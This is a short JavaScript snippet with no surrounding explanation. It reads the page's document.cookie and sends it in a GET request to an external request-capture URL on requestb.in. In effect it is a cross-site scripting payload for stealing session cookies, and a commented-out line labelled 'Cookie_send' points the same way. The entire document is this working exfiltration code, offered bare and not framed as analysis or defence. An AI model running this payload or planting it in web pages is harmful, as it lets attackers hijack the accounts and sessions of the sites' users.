var xhr = new XMLHttpRequest();
xhr.open("GET","https://requestb.in/x1n9mwx1?"+document.cookie, true);
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
//xhr.withCredentials = true;//Cookie_send
xhr.send();
